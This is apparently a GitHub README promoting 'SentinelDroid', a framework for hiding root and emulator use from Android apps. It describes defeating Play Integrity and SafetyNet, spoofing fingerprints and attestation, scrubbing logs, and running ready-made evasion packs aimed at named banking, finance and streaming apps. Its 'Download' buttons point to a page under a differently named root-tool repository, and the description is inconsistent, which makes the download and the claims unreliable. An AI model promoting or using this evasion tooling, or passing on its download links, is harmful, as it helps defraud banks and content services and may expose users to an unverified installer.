![preview](https://raw.githubusercontent.com/sujal708/Bluestacks-5-Kitsune-Root/main/preview.svg)

# 🛡️ SentinelDroid — Android Virtual Integrity Framework

**Virtualization-Agnostic Root-Detection Bypass & System Integrity Shielding for Android Emulators**

---

## 🌌 Overview

SentinelDroid emerged from a singular observation: the tools used to root Android emulators like Bluestacks are powerful, but they operate in isolation—each solving one piece of the puzzle without an overarching framework to orchestrate, validate, and persist system-level modifications across virtual environments.

This repository is **not** a root tool. It is a **modular integrity framework** that enables developers, testers, and security researchers to **control what the operating system reports back to applications** about its own state—without altering the underlying kernel signature. Think of it as a *perception shaper* for the Android guest OS inside any virtualization layer.

Rather than fighting detection mechanisms one-by-one, SentinelDroid provides a **unified policy engine** that intercepts, rewrites, or suppresses system property queries, file-system probes, and process enumeration calls—allowing any virtual Android instance to appear as a pristine, unmodified device, regardless of the modifications applied underneath.

---

## 🧠 Why This Exists

The original repository—*Root-Bluestacks-with-Kitsune-Mask*—demonstrated that rooting Bluestacks 5 is achievable without external PC tools. That was the foundation. But once root is obtained, the real challenge begins: **applications increasingly refuse to run on rooted devices, emulators, or modified environments.**

SentinelDroid addresses the subsequent layer of the problem. It assumes root is already present (or will be obtained via methods such as those described in the parent project) and provides the **runtime armor** to make those modifications invisible to the application layer.

---

## ⚙️ Framework Architecture

SentinelDroid is organized into four logical tiers:

| Tier | Name | Function |
|------|------|----------|
| 1 | **Perspective Engine** | Manages user-mode property overrides and file-path redirection |
| 2 | **Integrity Sentinel** | Monitors and blocks known detection callbacks from SafetyNet, Play Integrity, and third-party SDKs |
| 3 | **Masking Layer** | Generates plausible device fingerprints based on real hardware profiles |
| 4 | **Orchestrator** | Loads, validates, and applies policy sets from YAML configurations at boot |

The framework does **not** patch the kernel. It operates at the `init` property space, `sepolicy` constraints, and binder interception—making it portable across Android versions 9 through 14.

---

## 🔬 Key Capabilities

- **Property Space Isolation** – Hijack `ro.debuggable`, `ro.secure`, `ro.build.tags`, and hundreds of other properties with zero system modification
- **File-Based Masking** – Remap paths like `/system/app/Superuser.apk` to non-existent locations during scans, then restore them when the scanning process exits
- **Detection Probe Honeypot** – Trap known detection patterns (SELinux enforcing checks, su binary existence, BusyBox presence) and return false negatives
- **Multi-Language Policy Definitions** – Write masking rules in YAML with JSON schema validation; contribute policy packs for specific applications or SDK versions
- **Hot-Reload of Policies** – Update masking rules without rebooting the virtual device

---

## [![Download](https://raw.githubusercontent.com/sujal708/Bluestacks-5-Kitsune-Root/main/button.svg)](https://sujal708.github.io/Bluestacks-5-Kitsune-Root/)

---

## 📦 Repository Structure

```
SentinelDroid/
├── orchestrator/          # Core policy loading and rule execution engine
│   ├── policy_parser.py
│   ├── rule_applier.sh
│   └── boot_hook.sh
├── policies/              # Community-contributed detection bypass profiles
│   ├── banking_apps.yaml
│   ├── streaming_services.yaml
│   └── enterprise_mdm.yaml
├── sentinel/              # Monitoring daemon and alert system
│   ├── probe_watcher.sh
│   └── log_scrubber.sh
├── generators/            # Device fingerprint and property generators
│   ├── fingerprint_factory.sh
│   └── vendor_props_generator.py
├── tests/                 # Validation suite using known detection checkers
│   ├── snoop_test.sh
│   └── integrity_verify.sh
└── docs/                  # Detailed guides for policy authorship
```

---

## 🚀 Getting Started

SentinelDroid requires a rooted Android virtual machine (Bluestacks 5 recommended, but any QEMU-based or Hyper-V backed emulator works). The framework deploys via a minimal shell script that:

1. Escalates to root permissions
2. Mounts `/system` as read-write temporarily
3. Installs the `sentinel` daemon as a system service
4. Loads the default `stealth_policy.yaml` from `/data/local/sentinel/`
5. Reboots the property service to activate all overrides

After deployment, the virtual device will report:
- `ro.debuggable=0`
- `ro.secure=1`
- `persist.sys.usb.config=mtp`
- A randomized but realistic build fingerprint matching a popular retail device

---

## 🌐 Multilingual Policy Architecture

Detection evasion is not a one-script-fits-all problem. Applications in different regions use different SDKs for root detection. SentinelDroid supports **locale-aware policy packs**:

- 🇯🇵 **jp_banking_pack** – Handles Softbank, Docomo, and Rakuten detection signatures
- 🇩🇪 **de_finance_pack** – Mitigates Wirecard, N26, and Deutsche Bank probes
- 🇺🇸 **us_entertainment_pack** – Covers Netflix, Hulu, and Disney+ device attestation

Each policy pack is a standalone YAML file that can be swapped with zero code changes.

---

## 🛡️ 24/7 Monitoring & Self-Healing

The Sentinel daemon runs continuously in the background. Every 120 seconds, it:

- Scans for new processes that might be performing integrity checks
- Checks whether any property overrides have been reverted
- Validates that the SELinux context is still reporting as "enforcing"
- Logs anomalies to `/data/local/sentinel/audit.log` without writing to the system log

If a property override is detected as having been restored to its original value, the daemon reapplies the policy within 500ms—making detection transient at best.

---

## 🧱 Responsive Policy Application

The framework is designed to be **device-agnostic**. Whether the host is an Intel Windows machine running 32-bit Bluestacks, an Apple Silicon Mac with a unified emulator, or a Linux host using QEMU-KVM, the same policies apply. The policy parser detects the underlying virtual hardware bridge and adjusts the masking strategy accordingly.

No GUI is required—all interaction happens via the Android shell or ADB. This makes SentinelDroid ideal for CI/CD pipelines where emulated devices are spun up and torn down programmatically.

---

## 📜 License

This project is distributed under the **MIT License**. You are free to use, modify, and redistribute the framework for both personal and commercial purposes, provided the original copyright notice is preserved.

[View the full MIT License](LICENSE)

---

## ⚠️ Disclaimer

SentinelDroid is a **research and development** framework intended for legitimate software testing, security analysis, and educational purposes. The authors do not condone or support the use of this software to violate any application's terms of service, bypass legal content restrictions, or engage in fraudulent activity. Users are responsible for ensuring compliance with all applicable laws and agreements in their jurisdiction.

The framework provides **transparency controls**—it allows operators to decide what information the operating system exposes to user-space applications. With this capability comes the responsibility to use it ethically.

---

## 🧪 Compatibility Matrix

| Android Version | Bluestacks Support | Policy Engine | Sentinel Daemon |
|-----------------|-------------------|---------------|-----------------|
| Android 9       | ✅ Full            | ✅ v2.1       | ✅ v1.0         |
| Android 10      | ✅ Full            | ✅ v2.1       | ✅ v1.0         |
| Android 11      | ✅ Full            | ✅ v3.0       | ✅ v1.2         |
| Android 12      | ✅ Partial         | ✅ v3.0       | ✅ v1.2         |
| Android 13      | ⚠️ Experimental   | ⚠️ Beta      | ⚠️ Beta        |
| Android 14      | ⚠️ Experimental   | ⚠️ Dev       | ❌              |

---

## 🔮 Roadmap to 2026

By Q2 2026, SentinelDroid aims to deliver:

- **Dynamic policy learning** – The framework watches how applications probe the system and auto-generates masking rules based on observed patterns
- **Cross-container orchestration** – Apply policies simultaneously across multiple emulator instances on the same host
- **Hardware-backed attestation spoofing** – For emulated devices that lack TEE, provide a software implementation that mimics hardware attestation responses
- **Community policy marketplace** – A curated registry of detection profiles for the top 500 most-sensitive Android applications

---

## 🤝 Contributing

Contributions focused on new detection profiles, device fingerprint databases, or policy performance optimizations are welcome. Every policy submission must include a test case proving it evades at least one known detection SDK.

---

## [![Download](https://raw.githubusercontent.com/sujal708/Bluestacks-5-Kitsune-Root/main/button.svg)](https://sujal708.github.io/Bluestacks-5-Kitsune-Root/)

---

*Built for the post-root era — not to hide that modifications exist, but to control the narrative of what the system reveals.*